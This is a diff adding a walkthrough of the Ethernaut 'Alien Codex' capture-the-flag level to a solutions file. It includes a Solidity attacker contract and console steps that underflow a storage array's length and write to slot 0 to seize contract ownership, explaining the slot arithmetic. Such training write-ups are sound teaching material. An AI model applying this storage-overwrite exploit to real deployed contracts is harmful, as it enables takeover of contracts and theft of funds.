@@ -640,3 +640,65 @@ This level requires to retrieve the address of SimpleToken.
 The easiest way is to open etherscan and look at the transaction data directly, and you can directly see which address the ether was sent to. 
 Another method is to use the level contract address to calculate the contract address of SimpleToken. For the easiest understanding, please refer to [here](https://docs.openzeppelin.com/cli/2.8/deploying-with-create2#creating_a_smart_contract) :
 `keccack256(address, nonce)` where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).
+
+
+# 19. [Challenge 19: Alien Codex](https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272)
+
+Tasks:
+- You've uncovered an Alien contract. Claim ownership to complete the level.
+
+Useful Resources:
+- [Solution](https://github.com/STYJ/Ethernaut-Solutions)
+
+**Solution:** \
+```
+pragma solidity ^0.8.0;
+
+interface IAlienCodex {
+    function revise(uint i, bytes32 _content) external;
+}
+
+contract AlienCodex {
+    address levelInstance;
+    
+    constructor(address _levelInstance) {
+      levelInstance = _levelInstance;
+    }
+    
+    function claim() public {
+        unchecked{
+            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
+            IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
+        }
+    }
+}
+```
+
+This chapter focuses on understanding array underflow in storage and how to calculate the storage location of elements in array in storage. 
+Watching the code first, you will see that all functions require contact=true to be called. Open Console (F12) and call the make_contact function: `contract.make_contact()`
+At this point, you can view the data stored in codex in storage:
+`
+> await web3.eth.getStorageAt(instance, 1);
+< "0x0000000000000000000000000000000000000000000000000000000000000000"
+`
+codex is an array of bytes32, the length of the array is stored in slot 1, and the data of the actual elements in the array is stored in another method
+At this point, if we call the retract function, the array of codex can be underflowed: `contract.retract()`
+Look again at the data in slot 1 after the call:
+`
+> await web3.eth.getStorageAt(instance, 1);
+< "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+`
+
+It can be seen that the array length in slot 1 underflows to the maximum value.
+
+Recalling the requirements of the level, we need to override the value of owner, and the value of owner is in slot 0. Therefore, as long as the position of an array element is calculated, the position of the element will point to slot 0 because the maximum storage capacity of the storage is 2^256 slots because of the overflow. At this time, rewriting the codex element is equivalent to rewriting the value of owner.
+
+To calculate the value, you must first know the formula for the slot position of the element in the array. The formula is very simple: `keccak256(slot) + index`
+The codex array is defined at slot 1, so the first element is at slot keccak256(1) + 0, the second at slot keccak256(1) + 1, and so on.
+
+The maximum number of slots in Storage is 2^256, and the value is 0 – 2^256-1, because as long as the value is written in slot 2^256, it will overflow into slot 0.
+
+Integrate the above formula, namely: `2^256 = keccak256(slot) + index`
+Rearrange it, that is: `index = 2^256 - keccak256(slot)`
+As long as the revise function is called and the address of the player is written into `codex[2^256 – keccak256(slot)]`, the address of the original `owner` can be overwritten to complete this level. 
+
